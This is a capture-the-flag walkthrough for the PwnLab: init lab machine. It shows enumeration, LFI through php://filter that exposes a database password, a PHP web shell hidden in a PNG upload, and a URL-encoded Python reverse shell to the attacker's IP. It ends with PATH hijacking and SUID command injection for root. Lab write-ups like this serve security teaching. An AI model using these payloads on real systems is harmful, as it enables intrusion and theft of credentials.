# PWNLAB: INIT

## 1.Get VM IP
```text
root@kali~# nmap -sn 192.168.127.0/24
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 06:51 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00023s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.133
Host is up (0.00022s latency).
MAC Address: 00:0C:29:31:80:7A (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00010s latency).
MAC Address: 00:50:56:F4:78:0D (VMware)
Nmap scan report for 192.168.127.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.04 seconds
```
the ip address is `192.168.127.133`, so we begin the enumeration phase

## 2.Enumeration
```text
root@kali~# nmap -sV -sC 192.168.127.133 -oN fullscan

Host is up (0.0027s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41057/tcp   status
|   100024  1          44335/tcp6  status
|   100024  1          46125/udp   status
|_  100024  1          53161/udp6  status
3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, FoundRows, InteractiveClient, Speaks41ProtocolNew, LongPassword, SupportsLoadDataLocal, LongColumnFlag, Speaks41ProtocolOld, ConnectWithDatabase, ODBCClient, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsCompression, IgnoreSigpipes, SupportsTransactions, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: YsV6HIt.(zP`r?")FgSI
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:0C:29:31:80:7A (VMware)
```
so the box has port `80` and ofcourse a mysql database on port `3306`

exploring the port 80 will result in the page where it has 3 menues :

![mainPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f421609a-cf40-42b6-8dc3-717436dffea9)

at the same time fuzzing the applicaton shows extra directories :

```text
root@kali~# ffuf -w ~/wordlist/raft-large-directories.txt -u http://192.168.127.133/FUZZ
```

![ffuf](https://github.com/Git-K3rnel/VulnHub/assets/127470407/967d85bd-b4d0-468e-963a-89ab69ab2d1f)


another fuzzing :

```text
root@kali~# ffuf -w ~/wordlist/raft-medium-words.txt -u http://192.168.127.133/FUZZ/ -e .php,.zip,.rar,.png,.key,.jpg,.bak,.backup -fc 403
```

![ffuf2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/66b48b19-42f8-4a8c-9164-8d14458c535b)

found `config.php` in this fuzz.

back to website at login menue :

![loginpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2b717679-27b0-4d26-862a-650c4b22ea8e)

look at the url parameter `page`, try different `LFI` payloads bur didnot work:

```text
http://192.168.127.133/?page=../../../../../../../../etc/passwd
```

i decided to test if i can convert the php source code into base64 encode using php `filter` :

```text
http://192.168.127.133/?page=php://filter/convert.base64-encode/resource=config
```

![config](https://github.com/Git-K3rnel/VulnHub/assets/127470407/44ab7fc1-3fb1-4424-93ea-30482e87ba38)

 and after decoding the base64 i got the following code :

 ```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?> 
```

yes, we have mysql root password, try to connect to it :

```text
root@kali~# mysql -u root -h 192.168.127.133 -p
```

provide the password and get all the information from database :

![mysql](https://github.com/Git-K3rnel/VulnHub/assets/127470407/e1257850-8b93-462d-a687-4953066e060a)

here is the users base64 encoded passwords, login to the site with one of them for example `kent` :

![upload](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b6fb91f5-2690-4d05-9a73-f4b1a2fc5837)

i tried to upload a php file but i couldn't, after spending some time to find out how to upload a file i came to notinng then i decided to get the source php code of the page :

```text
http://192.168.127.133/?page=php://filter/convert.base64-encode/resource=upload
```

the php section contains the following code :

```php
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
```

this code shows that only acceptable extension are those in `$whilelist` variable and then it md5 hash the basename (for example test.png) and upload it to `/upload` directory

by inserting the php code in the last line of a png file, the uploader allows the file to be uploaded so i used the following code 

```php
<?php system($_GET["cmd"]) ?>
```
```text
root@kali~# echo '<?php system($_GET["cmd"]) ?>' >> test.png
```
and uploaded it, in the `/upload` folder you will find the md5 hash of the file name :

![hash](https://github.com/Git-K3rnel/VulnHub/assets/127470407/357e28e8-d616-4c98-a4f6-f9a3f7d09101)

now we should find a way to execute the code, after spending some time i tried to get source code of the index.php using php filter , the php code of the page is :

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>

<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?
```

## 3.Gaining Shell

yes, there is a `LFI` vulnerability in the cookie, so add the following cookie to your browser :

```text
lang=../upload/843eb8966ba95af4e3b673970ba8ebe8.png
```
you cand do it by browser storage section or console section by `document.cookie="lang=../upload/843eb8966ba95af4e3b673970ba8ebe8.png"`

and the call the page with `cmd` parameter and a reverse shell, i used pytnhon reverse shell and url encoded it :

```python
python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.127.128%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)'
```

start a listener :

```text
root@kali~# nc -nvlp 4444
```

![revshell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/3be2ce6e-280b-458d-8124-2cd8e24f14ab)

and we get the shell :

![revshell2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f79411f2-5ab7-4e8c-9fe2-60124cf51c4d)

now that we are in the machine try to login with another user we already found in the database for example `kane`

```text
root@kali~# su kane
```

`notice that you can not login to mike account with the password found in the database.`

naviage to home page and kane directory :

![kane](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a3e83bd2-6cd4-4a60-9e69-7ca3eb4ab3c4)

and run the `msgmike`, you will get the error :

```text
cat: /home/mike/msg.txt: No such file or directory
```

see the strings of this binary :

![strings](https://github.com/Git-K3rnel/VulnHub/assets/127470407/518e6018-81d1-4a9c-9d55-381260943f79)

yes, the binary is using `cat` without absolute path, so we can exploit this :

```text
kane@pwnlab:~$ echo '#!/bin/bash' > cat
kane@pwnlab:~$ echo '/bin/bash' >> cat
kane@pwnlab:~$ chmod 777 cat
kane@pwnlab:~$ export PATH=$PWD
kane@pwnlab:~$ ./msgmike
```

![cat](https://github.com/Git-K3rnel/VulnHub/assets/127470407/117f88cc-1be9-4278-91fb-19751b4cf7a8)

now you are user mike.

bring back the `PATH` variable to original state :

```text
mike@pwnlab: export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

## 4.Privilege Escalation

navigate to mike home directory :

![root](https://github.com/Git-K3rnel/VulnHub/assets/127470407/700c079b-7e37-47df-821d-064d9b86db8f)

the `msg2root` binary has SUID so we look at the strings of it :


![strings2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1df07df4-ebc4-43eb-9fc1-44ee3a2c0c23)


here we can exploit the `echo` so we execute the binary itself :


![msgroot](https://github.com/Git-K3rnel/VulnHub/assets/127470407/03ba8c47-8d4b-459a-9357-d86bd6c11422)

it just echos back whatever you give it , so it is worth trying command injection

simply add `;` after you input and try to get a shell :

![root2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/fd448ed0-082d-48f4-813c-d0513d819dc1)

yes, you are now the root, try to read the `flag.txt` form the `/root` directory :


![congrat](https://github.com/Git-K3rnel/VulnHub/assets/127470407/da50e641-454e-41a8-a032-fd931b5c08a4)





